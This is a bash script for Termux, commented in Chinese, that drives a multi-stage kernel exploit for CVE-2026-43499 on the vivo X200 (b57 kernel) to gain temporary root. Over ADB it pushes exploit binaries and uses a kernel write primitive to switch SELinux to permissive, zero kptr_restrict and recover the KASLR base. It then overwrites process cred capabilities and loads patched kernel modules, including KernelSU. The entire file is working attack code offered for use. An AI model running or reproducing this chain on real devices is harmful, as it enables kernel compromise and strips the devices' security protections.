#!/data/data/com.termux/files/usr/bin/bash
# ============================================================================
#  X200 模式 (vivo X200 PD2415 / b57 内核) - 移植自 ghostlock-x200-root v1.0
#  (Apache-2.0 / GPL-2.0-only, 见 x200/NOTICE-ghostlock-x200.txt)
#  独立链路, 不触碰现有 iQOO 机型的任何函数/变量/资产。
#  七阶段: permissive -> kptr -> base -> offsets -> patch_ko -> cred/CAPSROOT
#          -> INSMOD -> 验证 (全动态偏移, 零硬编码地址)
# ============================================================================

# ---------- X200 全局变量 (独立命名空间 x200_*) ----------
X200_DIR=""               # 工具箱内 x200 资产目录
X200_TAG=""               # 运行唯一后缀 (防 F2FS inode 损坏)
X200_SLOT_FILE=""         # GL_LOCK 槽位状态文件
X200_PORT=19000           # rootcmd 转发端口
X200_MAX_ROUNDS=5         # STAGE1/2 最大轮次

# ---------- 设备端路径 (唯一后缀) ----------
x200_dev_paths() {
    X200_TAG=$(date '+%H%M%S')
    X200_GLT="/data/local/tmp/glt_${X200_TAG}"
    X200_W2="/data/local/tmp/w2host_${X200_TAG}"
    X200_KSUD="/data/local/tmp/ksud_${X200_TAG}"
    X200_PERM="/data/local/tmp/permrestore_${X200_TAG}.ko"
    X200_KSU="/data/local/tmp/kernelsu_${X200_TAG}.ko"
    X200_SOCK="/data/local/tmp/rootcmd_${X200_TAG}.sock"
    X200_W2LOG="/data/local/tmp/w2h_${X200_TAG}.log"
    X200_CRED="/data/local/tmp/w2cred_${X200_TAG}.txt"
    X200_PROOF="/data/local/tmp/rootproof_${X200_TAG}.txt"
    X200_W2DBG="/data/local/tmp/w2dbg_${X200_TAG}.log"
}

# ---------- X200 设备识别 + 版本门禁 ----------
# 成功: 设置 X200_DIR, 返回 0; 失败: 打印原因, 返回 1
x200_check_device() {
    local model=$(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r')
    local product=$(adb shell getprop ro.product.name 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')
    local kver=$(adb shell cat /proc/version 2>/dev/null | tr -d '\r')

    echo_white "设备识别: model=$model product=$product"
    if [ "$product" != "pd2415" ] && [ "$model" != "V2319A" ] && [ "$model" != "vivo X200" ]; then
        # PD2415 是 X200 的 product; 也接受 ro.product.device=pd2415
        local dev=$(adb shell getprop ro.product.device 2>/dev/null | tr -d '\r' | tr '[:upper:]' '[:lower:]')
        if [ "$dev" != "pd2415" ]; then
            echo_red "[X200] 非 vivo X200 (PD2415), 本模式仅支持 X200"
            return 1
        fi
    fi

    # 内核门禁: 必须 b57 构建且 < 6.6.140
    if ! echo "$kver" | grep -q "gb57af212129c"; then
        echo_red "[X200] 内核非 b57 构建 (需 6.6.89-android15-8-gb57af212129c)"
        echo_red "      当前: $kver"
        return 1
    fi
    local kver_num=$(echo "$kver" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -n "$kver_num" ]; then
        local major=$(echo "$kver_num" | cut -d. -f1)
        local minor=$(echo "$kver_num" | cut -d. -f2)
        local patch=$(echo "$kver_num" | cut -d. -f3)
        # 内核 >= 6.6.140 已修复 CVE-2026-43499
        if [ "$major" -gt 6 ] || { [ "$major" -eq 6 ] && { [ "$minor" -gt 6 ] || { [ "$minor" -eq 6 ] && [ "$patch" -ge 140 ]; }; }; }; then
            echo_red "[X200] 内核 $kver_num >= 6.6.140, CVE-2026-43499 已修复, 无法使用"
            return 1
        fi
    fi
    log_ok "X200 设备确认: $kver_num b57 内核, 漏洞未修复"
    return 0
}

# ---------- 资产完整性检查 ----------
x200_check_assets() {
    local work_dir=$(get_script_dir)
    X200_DIR="${work_dir}/x200"
    local missing=""
    for f in glt w2host ksud permissive_restore.ko kernelsu.ko win_offs_b57.json \
             offsets_auto.py patch_ko_all.py rootcmd_client.py; do
        if [ ! -f "${X200_DIR}/$f" ]; then
            missing="$missing $f"
        fi
    done
    if [ -n "$missing" ]; then
        echo_red "[X200] 资产缺失:$missing"
        echo_red "      请确认 x200/ 目录完整 (参考 x200/README_X200.md)"
        return 1
    fi
    # 设备端 python3 检查 (Termux 本地执行偏移/重定位工具)
    if ! command -v python3 &>/dev/null; then
        echo_red "[X200] Termux 未安装 python3, 请执行: pkg install python"
        return 1
    fi
    # pyelftools (patch_ko_all 需要)
    python3 -c "import elftools" 2>/dev/null || {
        echo_yellow "[X200] Termux 缺少 pyelftools, 尝试安装: pip install pyelftools"
        if ! pip install pyelftools 2>/dev/null; then
            echo_red "[X200] pyelftools 安装失败, ko 重定位将无法进行"
            return 1
        fi
    }
    return 0
}

# ---------- GL_LOCK 槽位轮转 (bss 全零区宿主, 0x10/槽 x 256) ----------
# 每次写原语用新槽位; permissive_restore INSMOD 时清零宿主 -> 无限提权
x200_gl_lock() {
    local win="${X200_DIR}/win_offs_b57.json"
    local pmb=$(python3 -c "import json;print(json.load(open('$win'))['physmap_base'])")
    local zb=$(python3 -c "import json;print(json.load(open('$win'))['sym_offs']['zeroes_buf'])")
    local bid=$(adb shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r')
    local slot=0 sbid=""
    if [ -f "$X200_SLOT_FILE" ]; then
        sbid=$(sed -n '1p' "$X200_SLOT_FILE")
        slot=$(sed -n '2p' "$X200_SLOT_FILE")
        [ -z "$slot" ] && slot=0
    fi
    if [ "$bid" != "$sbid" ]; then
        slot=0; sbid="$bid"
    fi
    # lock = physmap_base + zeroes_buf + slot*0x10
    local lock=$(python3 -c "print(hex(int('$pmb',16)+int('$zb',16)+$slot*0x10))")
    printf '%s\n%s\n' "$sbid" "$((slot+1))" > "$X200_SLOT_FILE"
    echo "$lock"
}

# ---------- 运行 glt (后台 run.sh 模式, 与 ps1 一致) ----------
x200_run_glt() {
    # $1 = GL_TARGET 或 GL_W0 等参数串; 输出日志到 $2
    local params="$1" outlog="$2"
    local run_sh="/data/local/tmp/run_${X200_TAG}.sh"
    adb shell "echo '${params} timeout 20 ${X200_GLT} > ${outlog} 2>&1' > ${run_sh}; chmod 755 ${run_sh}; nohup sh ${run_sh} >/dev/null 2>&1 &" >/dev/null 2>&1
}

# ========== STAGE1: permissive (W2 形态) ==========
x200_stage1() {
    log_separator "STAGE1: 关闭 SELinux (Permissive)"
    local win="${X200_DIR}/win_offs_b57.json"
    local pmb=$(python3 -c "import json;print(json.load(open('$win'))['physmap_base'])")
    local seoff=$(python3 -c "import json;print(json.load(open('$win'))['sym_offs']['selinux_state'])")
    local se_p0=$(python3 -c "print('0x%x' % (int('$pmb',16)+int('$seoff',16)))")
    local r=0
    while [ $r -lt $X200_MAX_ROUNDS ]; do
        r=$((r+1))
        log_info "STAGE1 第 $r 轮"
        if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE1 设备掉线 (panic?)"; return 1; fi
        if [ "$(adb shell getenforce 2>/dev/null | tr -d '\r')" = "Permissive" ]; then
            log_ok "已是 Permissive"; return 0
        fi
        local lock=$(x200_gl_lock)
        adb shell "rm -f /data/local/tmp/slide_probe" >/dev/null 2>&1
        x200_run_glt "GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$lock GL_TARGET=$se_p0 GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1" "/data/local/tmp/p_${X200_TAG}.log"
        local i=0
        while [ $i -lt 12 ]; do
            i=$((i+1)); sleep 5
            if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE1 设备掉线"; return 1; fi
            if [ "$(adb shell getenforce 2>/dev/null | tr -d '\r')" = "Permissive" ]; then
                log_ok "STAGE1 成功 (第 $r 轮): Permissive"; return 0
            fi
        done
        log_warn "STAGE1 第 $r 轮未命中, 重试"
        sleep 5
    done
    log_error "STAGE1 失败 (5 轮后仍非 Permissive)"
    return 1
}

# ========== STAGE2: kptr_restrict = 0 (叶子 RED 形态) ==========
x200_stage2() {
    log_separator "STAGE2: 关闭 kptr_restrict"
    local win="${X200_DIR}/win_offs_b57.json"
    local pmb=$(python3 -c "import json;print(json.load(open('$win'))['physmap_base'])")
    local koff=$(python3 -c "import json;print(json.load(open('$win'))['sym_offs']['kptr_restrict'])")
    local w0=$(python3 -c "print('0x%x' % (int('$pmb',16)+int('$koff',16)-8))")
    local r=0
    while [ $r -lt $X200_MAX_ROUNDS ]; do
        r=$((r+1))
        log_info "STAGE2 第 $r 轮"
        if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE2 设备掉线"; return 1; fi
        if [ "$(adb shell cat /proc/sys/kernel/kptr_restrict 2>/dev/null | tr -d '\r')" = "0" ]; then
            log_ok "kptr_restrict 已是 0"; return 0
        fi
        local lock=$(x200_gl_lock)
        adb shell "rm -f /data/local/tmp/slide_probe" >/dev/null 2>&1
        x200_run_glt "GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TARGET_LEAF=1 GL_LOCK=$lock GL_W0=$w0 GL_ENTER_DELAY=5000 GL_ATTEMPTS=1" "/data/local/tmp/kptr_${X200_TAG}.log"
        local i=0
        while [ $i -lt 12 ]; do
            i=$((i+1)); sleep 5
            if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE2 设备掉线"; return 1; fi
            if [ "$(adb shell cat /proc/sys/kernel/kptr_restrict 2>/dev/null | tr -d '\r')" = "0" ]; then
                log_ok "STAGE2 成功 (第 $r 轮): kptr_restrict=0"; return 0
            fi
        done
        log_warn "STAGE2 第 $r 轮未命中, 重试"
        sleep 5
    done
    log_error "STAGE2 失败"
    return 1
}

# ========== STAGE3: KASLR base 严格校验 ==========
x200_stage3() {
    log_separator "STAGE3: KASLR base 校验"
    local text=$(adb shell "grep -m1 ' _text$' /proc/kallsyms" 2>/dev/null | tr -d '\r')
    local bstr=$(echo "$text" | awk '{print $1}')
    if [ -z "$bstr" ] || [ "$bstr" = "0000000000000000" ]; then
        log_error "STAGE3 失败: _text 无效 ($text)"
        return 1
    fi
    if ! echo "$bstr" | grep -qE '^ffffff[cdef][0-9a-f]+$'; then
        log_error "STAGE3 失败: base 高位异常 ($bstr)"
        return 1
    fi
    if ! echo "$bstr" | grep -q '00000$'; then
        log_error "STAGE3 失败: base 未对齐 ($bstr)"
        return 1
    fi
    X200_BASE="$bstr"
    log_ok "STAGE3 OK: base=$bstr"
    return 0
}

# ========== STAGE3.4: 动态偏移 (kallsyms + BTF + win_offs) ==========
x200_stage34() {
    log_separator "STAGE3.4: 动态偏移提取"
    local work=$(get_script_dir)
    local tmpd="${work}/x200_tmp_${X200_TAG}"
    mkdir -p "$tmpd"
    # dump kallsyms (当前 boot)
    adb shell "cat /proc/kallsyms" > "$tmpd/kallsyms.txt" 2>/dev/null
    local sz=$(wc -c < "$tmpd/kallsyms.txt")
    if [ "$sz" -lt 1000000 ]; then
        log_error "STAGE3.4 失败: kallsyms 过小 ($sz)"
        return 1
    fi
    # pull BTF
    adb pull /sys/kernel/btf/vmlinux "$tmpd/vmlinux.btf" >/dev/null 2>&1
    if [ ! -f "$tmpd/vmlinux.btf" ]; then
        log_error "STAGE3.4 失败: BTF 拉取失败"
        return 1
    fi
    # 本地运行 offsets_auto.py (纯标准库)
    python3 "${X200_DIR}/offsets_auto.py" live "$tmpd/kallsyms.txt" "$tmpd/vmlinux.btf" \
        "${X200_DIR}/win_offs_b57.json" "$tmpd/offsets.json" > "$tmpd/offsets.log" 2>&1
    if [ ! -f "$tmpd/offsets.json" ]; then
        log_error "STAGE3.4 失败: offsets.json 未生成"
        tail -5 "$tmpd/offsets.log" | while read l; do log_inject_output "$l"; done
        return 1
    fi
    # 提取关键值
    X200_SE_P0=$(python3 -c "import json;print(json.load(open('$tmpd/offsets.json'))['selinux_enforcing_p0'])")
    X200_CAP_OFF=$(python3 -c "import json;print(json.load(open('$tmpd/offsets.json'))['struct_offsets']['cred_cap_permitted'])")
    X200_CAPSYM=$(python3 -c "import json;print(json.load(open('$tmpd/offsets.json'))['capsym_va'])")
    X200_W2IPS=$(python3 -c "import json;print(','.join(json.load(open('$tmpd/offsets.json'))['w2host']['cred_ip_offs']))")
    X200_W2LO=$(python3 -c "import json;print(json.load(open('$tmpd/offsets.json'))['w2host']['win_lo'])")
    X200_W2HI=$(python3 -c "import json;print(json.load(open('$tmpd/offsets.json'))['w2host']['win_hi'])")
    if [ -z "$X200_SE_P0" ] || [ -z "$X200_CAPSYM" ]; then
        log_error "STAGE3.4 失败: 偏移不完整"
        return 1
    fi
    # 内存范围 (真实 MemTotal)
    local mem_kb=$(adb shell "cat /proc/meminfo | grep MemTotal" 2>/dev/null | awk '{print $2}')
    local pmb=$(python3 -c "import json;print(json.load(open('${X200_DIR}/win_offs_b57.json'))['physmap_base'])")
    X200_CAND_MIN=$(python3 -c "print('0x%x' % (int('$pmb',16)+0x40000000))")
    X200_DIRECT_END=$(python3 -c "print('0x%x' % (int('$pmb',16)+$mem_kb*1024))")
    X200_TMPDIR="$tmpd"
    log_ok "STAGE3.4 OK: se=$X200_SE_P0 capsym=$X200_CAPSYM"
    return 0
}

# ========== STAGE3.5: ko 重定位 + 推送 ==========
x200_stage35() {
    log_separator "STAGE3.5: ko 重定位"
    local tmpd="$X200_TMPDIR"
    python3 "${X200_DIR}/patch_ko_all.py" "${X200_DIR}/permissive_restore.ko" \
        "$tmpd/kallsyms.txt" "$tmpd/perm_patched.ko" > "$tmpd/patch_perm.log" 2>&1
    if [ ! -f "$tmpd/perm_patched.ko" ]; then
        log_error "STAGE3.5 失败: permissive_restore 重定位失败"
        tail -5 "$tmpd/patch_perm.log" | while read l; do log_inject_output "$l"; done
        return 1
    fi
    python3 "${X200_DIR}/patch_ko_all.py" "${X200_DIR}/kernelsu.ko" \
        "$tmpd/kallsyms.txt" "$tmpd/ksu_patched.ko" > "$tmpd/patch_ksu.log" 2>&1
    if [ ! -f "$tmpd/ksu_patched.ko" ]; then
        log_error "STAGE3.5 失败: kernelsu 重定位失败"
        return 1
    fi
    adb push "$tmpd/perm_patched.ko" "$X200_PERM" >/dev/null 2>&1 && adb shell "chmod 644 $X200_PERM" >/dev/null 2>&1
    adb push "$tmpd/ksu_patched.ko" "$X200_KSU" >/dev/null 2>&1 && adb shell "chmod 644 $X200_KSU" >/dev/null 2>&1
    adb push "${X200_DIR}/ksud" "$X200_KSUD" >/dev/null 2>&1 && adb shell "chmod 755 $X200_KSUD" >/dev/null 2>&1
    log_ok "STAGE3.5 OK: ko 已重定位并推送"
    return 0
}

# ========== STAGE4+5: w2host cred 泄漏 + CAPSROOT ==========
x200_stage45() {
    log_separator "STAGE4+5: cred 泄漏 + CAPSROOT"
    local tmpd="$X200_TMPDIR"
    local cred=""
    local rr=0
    while [ $rr -lt 3 ] && [ -z "$cred" ]; do
        rr=$((rr+1))
        log_info "STAGE4/5 第 $rr 轮"
        if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE4 设备掉线"; return 1; fi
        # 杀残留 w2host (用 [t] 字面防自杀)
        adb shell "pgrep -f 'w2hos[t]_' | xargs -r kill 2>/dev/null" >/dev/null 2>&1
        sleep 2
        adb shell "rm -f $X200_SOCK $X200_CRED $X200_W2DBG $X200_PROOF" >/dev/null 2>&1
        adb shell "W2_SOCK=$X200_SOCK W2_CRED=$X200_CRED W2_DBG=$X200_W2DBG W2_PROOF=$X200_PROOF W2_CRED_IPS=$X200_W2IPS W2_IP_LO=$X200_W2LO W2_IP_HI=$X200_W2HI W2_CAND_MIN=$X200_CAND_MIN W2_DIRECT_END=$X200_DIRECT_END nohup $X200_W2 > $X200_W2LOG 2>&1 &" >/dev/null 2>&1
        local credline=""
        local i=0
        while [ $i -lt 40 ]; do
            i=$((i+1)); sleep 3
            if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE4 设备掉线"; return 1; fi
            credline=$(adb shell "cat $X200_CRED 2>/dev/null" 2>/dev/null | tr -d '\r')
            if [ -n "$credline" ] && [ ${#credline} -gt 20 ]; then break; fi
        done
        # 候选过滤
        local cands=""
        for c in $credline; do
            if echo "$c" | grep -qE '^ffffff[8cdef][0-9a-f]{9}$' && [ "$c" != "0000000000000000" ]; then
                cands="$cands $c"
            fi
        done
        if [ -z "$cands" ]; then
            log_warn "STAGE4 第 $rr 轮: 候选无效"
            continue
        fi
        log_ok "STAGE4 第 $rr 轮: 候选=$(echo $cands | tr ' ' ',')"
        for c in $cands; do
            if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE5 设备掉线 (write panic?)"; return 1; fi
            local t=$(python3 -c "print('0x%x' % (int('$c',16)+int('$X200_CAP_OFF',16)))")
            adb shell "rm -f $X200_PROOF" >/dev/null 2>&1
            local lock=$(x200_gl_lock)
            x200_run_glt "GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_TASK_W2=1 GL_LOCK=$lock GL_TARGET=$t GL_INIT_CRED=$X200_CAPSYM GL_FPAD=24 GL_PROBE=1 GL_ATTEMPTS=1" "/data/local/tmp/w_${X200_TAG}.log"
            local rp=""
            local j=0
            while [ $j -lt 12 ]; do
                j=$((j+1)); sleep 2
                if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE5 设备掉线 (write panic)"; return 1; fi
                rp=$(adb shell "cat $X200_PROOF 2>/dev/null" 2>/dev/null | tr -d '\r')
                if echo "$rp" | grep -q "CAPSROOT"; then
                    log_ok "STAGE5 OK: $rp"
                    cred="$c"; break
                fi
            done
            [ -n "$cred" ] && break
            log_warn "STAGE5 候选 $c 未命中"
        done
    done
    if [ -z "$cred" ]; then
        log_error "STAGE5 失败: 3 轮后无 CAPSROOT"
        return 1
    fi
    sleep 3
    if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE5 后设备掉线"; return 1; fi
    log_ok "STAGE5 OK: cred=$cred"
    return 0
}

# ========== rootcmd 客户端 ==========
x200_rootcmd() {
    # $1 = rootcmd 命令 (ID/READ/WRITE/INSMOD/RMMOD/EXEC ...)
    adb forward "tcp:$X200_PORT" "localfilesystem:$X200_SOCK" >/dev/null 2>&1
    python3 "${X200_DIR}/rootcmd_client.py" "$1" 2>&1 | tr -d '\r'
}

# ========== STAGE6: INSMOD permissive_restore (+ kernelsu) ==========
x200_stage6() {
    log_separator "STAGE6: 加载内核模块"
    local tmpd="$X200_TMPDIR"
    local win="${X200_DIR}/win_offs_b57.json"
    local pmb=$(python3 -c "import json;print(json.load(open('$win'))['physmap_base'])")
    local zb=$(python3 -c "import json;print(json.load(open('$win'))['sym_offs']['zeroes_buf'])")
    local gl_zeroes=$(python3 -c "print('0x%x' % (int('$pmb',16)+int('$zb',16)))")

    # rootcmd 在线检查
    local id=$(x200_rootcmd "ID")
    log_info "rootcmd: $id"
    if ! echo "$id" | grep -q 'uid=2000'; then
        log_error "STAGE6 失败: rootcmd 未在线"
        return 1
    fi
    # 模块名兼容 (myroot 旧资产 / permissive_restore)
    local dev_mod="permissive_restore"
    if adb shell "cat /proc/modules 2>/dev/null | grep -E '^(myroot|permissive_restore)'" 2>/dev/null | grep -q '^myroot'; then
        dev_mod="myroot"
    fi
    # 先 RMMOD 旧的 (清零 GL 宿主)
    if adb shell "cat /proc/modules 2>/dev/null | grep -qE '^($dev_mod)'"; then
        log_info "STAGE6: 卸载旧 $dev_mod ..."
        x200_rootcmd "RMMOD $dev_mod" >/dev/null 2>&1
        sleep 2
    fi
    log_info "STAGE6: INSMOD permissive_restore (selinux_state_p0=$X200_SE_P0 gl_zeroes_p0=$gl_zeroes)"
    local r=$(x200_rootcmd "INSMOD $X200_PERM selinux_state_p0=$X200_SE_P0 gl_zeroes_p0=$gl_zeroes")
    log_info "INSMOD permissive_restore: $r"
    sleep 3
    if ! adb shell "cat /proc/modules 2>/dev/null | grep -q '^$dev_mod'"; then
        log_error "STAGE6 失败: permissive_restore 未加载: $r"
        local dm=$(x200_rootcmd "READ /dev/kmsg")
        echo "$dm" | tail -40 | while read l; do log_inject_output "$l"; done
        return 1
    fi
    log_ok "STAGE6 OK: $dev_mod 已加载 (GL 宿主已清零)"
    # kernelsu (可选, 幂等)
    if adb shell "cat /proc/modules 2>/dev/null | grep -q '^kernelsu'"; then
        log_info "STAGE6: kernelsu 已加载, 跳过"
    else
        log_info "STAGE6: INSMOD kernelsu ..."
        local r2=$(x200_rootcmd "INSMOD $X200_KSU")
        log_info "INSMOD kernelsu: $r2"
        sleep 6
        if ! adb shell "cat /proc/modules 2>/dev/null | grep -q '^kernelsu'"; then
            log_warn "STAGE6: kernelsu 未加载 (可忽略, 仍为临时 root)"
        else
            log_ok "STAGE6 OK: kernelsu 已加载"
        fi
    fi
    # 槽位重置
    local bid=$(adb shell cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '\r')
    printf '%s\n0\n' "$bid" > "$X200_SLOT_FILE"
    return 0
}

# ========== STAGE7: 验证 (25s 后 Permissive + 网络) ==========
x200_stage7() {
    log_separator "STAGE7: 验证"
    local i=0 perm_back=0
    while [ $i -lt 15 ]; do
        i=$((i+1)); sleep 3
        if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "STAGE7 设备掉线 (panic?)"; return 1; fi
        if [ "$(adb shell getenforce 2>/dev/null | tr -d '\r')" = "Permissive" ]; then perm_back=1; break; fi
    done
    local se=$(adb shell getenforce 2>/dev/null | tr -d '\r')
    local mods=$(adb shell "cat /proc/modules 2>/dev/null | grep -E '^(kernelsu|myroot|permissive_restore)'" 2>/dev/null | tr -d '\r')
    local ping=$(adb shell "ping -c 2 -W 2 223.5.5.5 2>&1 | tail -1" 2>/dev/null | tr -d '\r')
    log_info "SELinux: $se"
    log_info "模块: $mods"
    log_info "网络: $ping"
    if [ "$se" != "Permissive" ]; then
        log_error "STAGE7 失败: 仍为 Enforcing"
        return 1
    fi
    log_ok "=== X200 临时 root 成功: Permissive + 模块已加载 + 网络通 ==="
    echo_green "=== X200 临时 root 成功 ==="
    echo_yellow "注意: 重启后 root 消失, 需重新运行本功能"
    return 0
}

# ========== X200 主流程 ==========
func_x200_root() {
    clear
    print_line
    center_green "功能6 vivo X200 临时root"
    print_line

    # 初始化日志
    if ! init_log_dir; then echo_red "[错误] 日志初始化失败"; read -p "按回车返回"; return; fi
    init_log_file
    log_separator "X200 模式开始"
    log_info "脚本版本: 临时root工具箱8.0 + X200 扩展"
    log_info "X200 链路移植自 ghostlock-x200-root v1.0 (Apache-2.0/GPL-2.0)"

    # 连接检查
    if ! check_wireless_adb; then
        echo_red "[提示] 当前未连接无线调试, 请先使用功能1/2 连接设备"
        read -p "按回车返回菜单"
        return
    fi

    # 设备识别 + 门禁
    if ! x200_check_device; then
        read -p "按回车返回菜单"
        return
    fi

    # 资产检查
    if ! x200_check_assets; then
        read -p "按回车返回菜单"
        return
    fi

    # 初始化路径与状态
    x200_dev_paths
    X200_SLOT_FILE="$(get_script_dir)/state/gl_lock_x200.txt"
    mkdir -p "$(get_script_dir)/state"

    # uptime 门禁 (>= 240s)
    log_info "等待设备稳定 (uptime >= 240s) ..."
    local i=0
    while [ $i -lt 40 ]; do
        local up=$(adb shell "cat /proc/uptime" 2>/dev/null | awk '{print $1}' | tr -d '\r')
        local up_ok=$(echo "$up" | awk '{print ($1+0) > 240 ? 1 : 0}')
        if [ "$up_ok" = "1" ]; then
            log_ok "uptime=$up OK"; break
        fi
        i=$((i+1)); sleep 10
    done
    if ! adb shell 'echo ok' >/dev/null 2>&1; then log_error "设备不可达"; read -p "按回车返回"; return; fi

    # 推送二进制
    log_info "推送 glt/w2host/ksud ..."
    adb shell "rm -f $X200_GLT" >/dev/null 2>&1
    adb push "${X200_DIR}/glt" "$X200_GLT" >/dev/null 2>&1 && adb shell "chmod 755 $X200_GLT" >/dev/null 2>&1
    adb shell "rm -f $X200_W2" >/dev/null 2>&1
    adb push "${X200_DIR}/w2host" "$X200_W2" >/dev/null 2>&1 && adb shell "chmod 755 $X200_W2" >/dev/null 2>&1
    log_ok "二进制已推送"

    # 七阶段
    if ! x200_stage1; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage2; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage3; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage34; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage35; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage45; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage6; then show_log_info; read -p "按回车返回"; return; fi
    if ! x200_stage7; then show_log_info; read -p "按回车返回"; return; fi

    log_separator "X200 模式结束"
    show_log_info
    read -p "按回车返回菜单"
}
